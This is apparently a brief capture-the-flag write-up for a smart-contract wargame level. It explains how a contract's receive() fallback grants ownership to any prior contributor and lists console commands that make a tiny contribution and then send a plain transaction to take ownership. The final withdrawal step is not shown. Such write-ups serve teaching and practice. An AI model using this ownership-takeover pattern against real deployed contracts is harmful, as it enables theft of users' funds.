### Task

>Look carefully at the contract's code below.
>
>You will beat this level if
>
>1.    you claim ownership of the contract
>2.    you reduce its balance to 0

### Observations

Can either gain ownership through contribute() function, in which case I require over 100 Ether (takes too long).
Or I can gain ownership by exploiting the Fallback function recieve(), which runs upon funds entering the contract without calldata.

### Steps

Check who is owner.
`contract.owner()`

I need to be a contributer. So I'll send less than 0.001 Eth to contribute function.
`contract.contribute({value: web3.toWei('0.0009')})`

Check I am a contributer.
`contract.getContribution().then(v=>v.toString())`

Now I just need to trigger the recieve() fallback.
`contract.sendTransaction({value: web3.toWei('0.0001')})`

Check I am now owner.
`contract.owner()`
`player`
